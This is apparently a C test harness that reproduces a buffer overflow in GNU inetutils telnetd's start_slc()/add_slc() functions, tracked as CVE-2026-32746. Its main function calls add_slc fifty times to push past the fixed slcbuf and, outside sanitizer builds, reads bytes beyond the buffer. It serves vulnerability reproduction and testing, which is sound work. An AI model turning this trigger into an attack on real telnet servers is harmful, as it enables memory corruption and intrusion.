/* GNU inetutils telnetd CVE-2026-32746 harness.
 * start_slc()/add_slc() below come verbatim from the pinned telnetd/slc.c;
 * only the surrounding globals and init_termbuf() are stubs. NSLC=18 and the
 * LM_SLC/IAC/SB constants come from arpa/telnet.h.
 */
#include <arpa/telnet.h>
#include <stdio.h>
#include <string.h>

typedef unsigned char cc_t;

static unsigned char *def_slcbuf;
static int def_slclen;
static int slcchange;
static unsigned char *slcptr;
static unsigned char slcbuf[NSLC * 6];

static void init_termbuf(void) {}

#include "slc_functions.inc"

int main(void)
{
    start_slc(0);
    for (int i = 0; i < 50; ++i)
        add_slc((char) 0x42, (char) 0x41, (cc_t) 0x5a);

    printf("slcbuf_size=%d slcptr_offset=%ld\n", (int)sizeof slcbuf,
           (long)(slcptr - slcbuf));
/* The post-sink readback reads past slcbuf by design; it is only meaningful
 * in the plain build. Skip under any ASan, or ASan reports a false OOB READ
 * in main on the fixed pin. GCC uses __SANITIZE_ADDRESS__; clang needs
 * __has_feature(address_sanitizer). */
#if defined(__SANITIZE_ADDRESS__)
#define FRONTIER_ASAN 1
#elif defined(__has_feature)
#if __has_feature(address_sanitizer)
#define FRONTIER_ASAN 1
#endif
#endif
#ifndef FRONTIER_ASAN
    const unsigned char *p = slcbuf + sizeof slcbuf + 1;
    printf("readback+0=");
    for (int i = 0; i < 9; ++i) printf("%02x", p[i]);
    printf("\n");
#endif
    return 0;
}
